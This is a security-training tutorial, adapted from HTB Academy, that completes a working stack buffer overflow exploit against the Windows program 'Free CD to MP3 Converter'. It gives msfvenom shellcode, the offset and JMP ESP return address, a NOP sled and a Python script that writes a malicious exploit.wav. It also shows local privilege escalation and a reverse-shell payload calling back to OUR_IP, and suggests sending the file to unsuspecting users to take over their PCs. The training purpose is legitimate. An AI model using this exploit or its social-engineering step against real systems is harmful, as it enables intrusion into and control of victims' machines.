So far in our exercise to identify and exploit a stack-based buffer overflow vulnerability, we have done the following:

1. Fuzzed Parameters
2. Controlled EIP
3. Identified Bad Characters
4. Found a Return Instruction

The final step is to write some shellcode on the stack that gets executed when the Return Addresses we found earlier are executed since we look for addresses of instructions that execute the code written on the top of the stack.

---

## Shellcode Generation

We've thoroughly discussed shellcode generation in the [Intro to Assembly Language](https://academy.hackthebox.com/course/preview/intro-to-assembly-language) module and the various methods to do so. In some instances, we may find ourselves limited to a very short buffer space, where we would not have many bytes to write to and may have to use one of the methods discussed to generate a short shellcode. However, we are dealing with thousands of bytes of buffer in our case, so we would not have to worry about such limitations.

So, to generate our shellcode, we will use `msfvenom`, which can generate shellcodes for Windows systems, while tools like `pwntools` currently only support Linux shellcodes.

First, we can list all available payloads for `Windows 32-bit`, as follows:

  Jumping to Shellcode

```shell-session
frodonomojo@htb[/htb]$ msfvenom -l payloads | grep

...SNIP...
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
...SNIP...
```

For initial testing, let's try `windows/exec` and execute `calc.exe` to open the Windows calculator if our exploit is successful. To do this, we'll use `CMD=calc.exe`, `-f 'python'` since we are using a python exploit, and `-b` to specify any bad characters:

  Jumping to Shellcode

```shell-session
frodonomojo@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
...SNIP...
```

Note: We used the `-b` to showcase how to eliminate any bad characters from our shellcode, where we can add all bad characters we need to eliminate (e.g. `'\x00\x0a\x0d'`). Even if our shellcode did not have any bad characters, this shellcode should still run, though the final shellcode is usually longer if we specify bad characters

Next, we can copy the `buf` variable into our exploit, where we will now define the final function `def exploit()`, which will be our main exploit code:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

Tip: It is advised as a best practice to add a comment above any shellcode with the command used to generate it, in case we want to modify it or regenerate it in the future, or if we just wanted to know what it will execute.

---

## The Final Payload

Now that we have our shellcode, we can write the final payload that we'll write to the `.wav` file to be opened in our program. So far, we know the following:

1. `buffer`: We can fill the buffer by writing `b"A"*offset`
2. `EIP`: The following 4 bytes should be our return address
3. `buf`: After that, we can add our shellcode

In the previous section, we've found multiple return addresses that can work in executing any shellcode we write on the stack:

|`ESP`|`JMP ESP`|`PUSH ESP; RET`|
|---|---|---|
|`0014F974`|`00419D0B`|`0047D4F5`|
|-|`00463B91`|`00483D0E`|
|-|`00477A8B`|-|
|-|`0047E58B`|-|
|-|`004979F4`|-|

Any of these should work in executing the shellcode we write on the stack (feel free to test some of them). We will start with the most reliable one, `JMP ESP`, and we'll pick the first address `00419D0B` and write it as our return address.

To convert it from `hex` to an address in Little Endian, we'll use a python function called `pack` found in the `struct` library. We can import this function by adding the following line at the beginning of our code:

Code: python

```python
from struct import pack
```

Now we can use `pack` to turn our address into its proper format, and use '`<L`' to specify that we want it in Little Endian formatting:

Code: python

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
```

---

## Shellcode Padding

Now that we have `buffer` and `eip`, we can add our shellcode `buf` after them and generate our `.wav` file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our `JMP ESP` instruction is executed, the top of the stack address `ESP` may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail. (You can check the [Intro to Assembly Language](https://academy.hackthebox.com/module/details/85) module to get a better understanding of Stack Alignment).

One way to solve this is to add a few junk bytes before our shellcode and keep testing the code until we find out exactly how many bytes get skipped before our shellcode. This is so we can precisely land at the beginning of our shellcode when our `JMP ESP` instruction is executed. However, we only need to resort to this method if we had a limited buffer space since it takes several attempts to precisely find which byte position of our shellcode the execution starts.

To avoid having to do this, we can add a few `NOP` bytes before our shellcode, which has the machine code `0x90`. The assembly instruction `NOP` is short for `No Operation`, and it is used in assembly for things like waiting for other operations to finish. So, if the `JMP ESP` execution starts at one of these bytes, the program will not crash and will execute these bytes by doing nothing until it reaches the beginning of our shellcode. At which point, our entire shellcode should get executed and should run successfully.

The stack alignment needed is usually not more than `16` bytes in most cases, and it may rarely reach `32` bytes. Since we have a lot of buffer space, we'll just add `32` bytes of `NOP` before our shellcode, which should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shellcode:

Code: python

```python
    nop = b"\x90"*32
```

---

## Writing Payload to File

With that, our final payload should look as follows:

Code: python

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
```

We can then write `payload` to a `exploit.wav` file, like we did in previous functions:

Code: python

```python
    with open('exploit.wav', 'wb') as f:
        f.write(payload)
```

Once we assemble all of these parts, our final `exploit()` function should look as follows:

Code: python

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

We can now run our code with `F5` in `IDLE` to generate the `exploit.wav` file. Once we do, we can run the `Free CD to MP3 Converter` program (we don't need to run it in `x32dbg`) and load our file to it:

![Calc](https://academy.hackthebox.com/storage/modules/89/win32bof_calc.jpg)

As we can see, our program did crash, but we successfully exploited it and ran our shellcode, which opened `calc.exe`.

---

## Gaining Code Execution

The final step would be to utilize this exploit to gain code execution. Since we are dealing with a local buffer overflow running in a machine we have user-level access to, we will usually use this exploit to escalate our privileges to the admin user if a local admin executed this program. Another way to utilize this is by writing a malicious `.wav` file that sends back a reverse shell. We would then share this malicious file with a user that uses this vulnerable application and ask them to encode our malicious `.wav` file. When they do, we would receive a reverse shell and gain control over their PC.

To do either of these options, all we have to do is change our shellcode to do something else. For local privilege escalation, we can use the same command we used for `calc.exe`, but use `CMD=cmd.exe` instead, as follows:

  Jumping to Shellcode

```shell-session
frodonomojo@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
...SNIP...
```

If we wanted to get a reverse shell, there are many `msfvenom` payloads we can use, which we can get a list of as follows:

  Jumping to Shellcode

```shell-session
frodonomojo@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...
```

We can use the `windows/shell_reverse_tcp` payload as follows:

  Jumping to Shellcode

```shell-session
frodonomojo@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...
```

We can replace the `buf` shellcode in our exploit with either of these and test it. Let's assume we have access to a machine where we have the privilege to run this program as an administrator. We will write the shellcode for local privilege escalation in our exploit, generate our `exploit.wav` file, and load it into the program:

![CMD Admin](https://academy.hackthebox.com/storage/modules/89/win32bof_cmd_admin.jpg)

As we can see, this time, a `cmd.exe` window popped up, and we see in its title `Administrator`, which means that it is indeed running with escalated privileges, matching the user who was running `Free CD to MP3 Converter`.

Try to use the second shellcode to get a reverse shell on your Linux VM/`PwnBox`.

You can download the final exploit code from the following link. Don't forget to rename it from `.txt` to `.py`.

[Download win32bof_exploit_py.txt here](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_py.txt)

**Credit:** This information was adapted from an excellent guide on [HTB Academy](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86). Be sure to check out the original post for more details.

